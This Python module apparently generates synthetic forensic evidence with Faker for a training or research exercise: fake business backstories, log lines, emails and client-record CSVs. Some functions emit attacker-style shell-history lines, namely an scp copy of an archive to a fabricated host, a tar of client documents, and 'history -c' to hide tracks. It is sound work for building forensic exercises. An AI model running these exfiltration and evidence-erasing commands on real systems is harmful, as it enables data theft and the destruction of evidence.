"""Synthetic evidence content generators, backed by Faker.

Every value here is fabricated. Faker never touches real personal data -
that's precisely why this project's forensic track doesn't need ethics
approval (see the research tracker's justification for Faker). Nothing
in this module should ever accept or embed a real name, email, IP, or
record: if a demo scenario needs to "feel real," make it more elaborate
with Faker, never substitute anything genuine.
"""

from dataclasses import dataclass
from datetime import datetime

from faker import Faker

fake = Faker()

# Small-business flavors for fictional_business_context() - deliberately
# ordinary, low-stakes organizations (not banks, hospitals, or anything
# whose fictional compromise could read as making light of a genuinely
# high-consequence breach) - a storyline's backstory should feel concrete,
# not dramatic. All fabricated, same as every other generator here.
_SMALL_BUSINESS_TYPES = [
    "catering company", "bakery", "plumbing business", "auto repair shop",
    "veterinary clinic", "print shop", "landscaping company", "accounting firm",
    "furniture restorer", "bicycle repair shop",
]


@dataclass
class BusinessContext:
    name: str
    business_type: str
    admin_name: str


def fictional_business_context() -> BusinessContext:
    """A small, fabricated organization to ground a storyline's backstory in
    - who actually runs this machine, and why, rather than a narrative
    describing a VM in the abstract. See module docstring: fully synthetic,
    same as every other generator here."""
    return BusinessContext(
        name=fake.company(),
        business_type=fake.random_element(_SMALL_BUSINESS_TYPES),
        admin_name=fake.name(),
    )


def shell_command_exfiltration(filename: str | None = None, host: str | None = None) -> str:
    """A single shell-history line: archiving and copying data off-box."""
    filename = filename or f"{fake.word()}_client_export.tar.gz"
    host = host or fake.hostname()
    return f"scp {filename} {fake.user_name()}@{host}:/data/backup/"


def shell_command_archive(directory: str | None = None) -> str:
    """A single shell-history line: bundling a directory before exfiltration."""
    directory = directory or f"/home/{fake.user_name()}/Documents/clients"
    return f"tar -czf {fake.word()}_archive.tar.gz {directory}"


def shell_command_history_clear() -> str:
    """A single shell-history line: an attempt to cover tracks.

    `history -c` alone (clearing the in-memory session history), not
    `&& rm -f ~/.bash_history` (also deleting the file) - the latter was
    tried first and is both less realistic (a real attempt to look
    innocuous rarely also deletes the file outright, which is far more
    conspicuous) and actively wrong here: this line is meant to sit
    *alongside* other shell_history artefacts (shell_command_archive(),
    shell_command_exfiltration()) targeting the same .bash_history file,
    and deleting that file mid-playbook destroyed the evidence those
    other tasks had just written - confirmed by reproducing exactly this
    in a real test-deploy run (3 checks failed, all on lines written
    before this task ran; everything after it verified fine). See
    docs/METHODOLOGY.md (week 5).
    """
    return "history -c"


def service_log_entry(service: str, event: str, when: datetime, user: str | None = None, source_ip: str | None = None) -> str:
    """A syslog-style line for any service's auth-relevant event.

    Generalizes what used to be auth_log_entry()'s sshd-only line, so a
    storyline whose entry vector isn't SSH (a database, Telnet, an open
    firewall rule - see storyline_builder.py, week 6) can still produce a
    plausible log line naming the actual service involved, rather than
    every storyline claiming an SSH login regardless of what the run's
    own generation step actually claimed to misconfigure.
    """
    user = user or fake.user_name()
    source_ip = source_ip or fake.ipv4_private()
    timestamp = when.strftime("%b %d %H:%M:%S")
    hostname = fake.hostname().split(".")[0]
    return f"{timestamp} {hostname} {service}[{fake.random_int(1000, 9999)}]: {event} for user {user} from {source_ip}"


def auth_log_entry(event: str, when: datetime, user: str | None = None, source_ip: str | None = None) -> str:
    """A syslog-style line for an SSH auth-relevant event (e.g. USB mount, large transfer)."""
    return service_log_entry("sshd", event, when, user=user, source_ip=source_ip)


def email_draft(subject: str, body: str, sender: str | None = None, recipient: str | None = None) -> str:
    """A plain-text email draft (.eml-lite): headers plus body, fully synthetic."""
    sender = sender or fake.email()
    recipient = recipient or fake.email()
    return (
        f"From: {sender}\n"
        f"To: {recipient}\n"
        f"Subject: {subject}\n"
        f"Date: {fake.date_time_this_month().strftime('%a, %d %b %Y %H:%M:%S')}\n"
        "\n"
        f"{body}\n"
    )


def fake_client_records_csv(rows: int = 25) -> str:
    """A CSV of synthetic 'client records' - the shape of exfiltrated data
    without any real information at all, for deleted-file scenarios."""
    lines = ["id,name,email,phone,account_ref"]
    for i in range(1, rows + 1):
        lines.append(
            f"{i},{fake.name()},{fake.email()},{fake.phone_number()},{fake.bothify('ACC-#####')}"
        )
    return "\n".join(lines) + "\n"
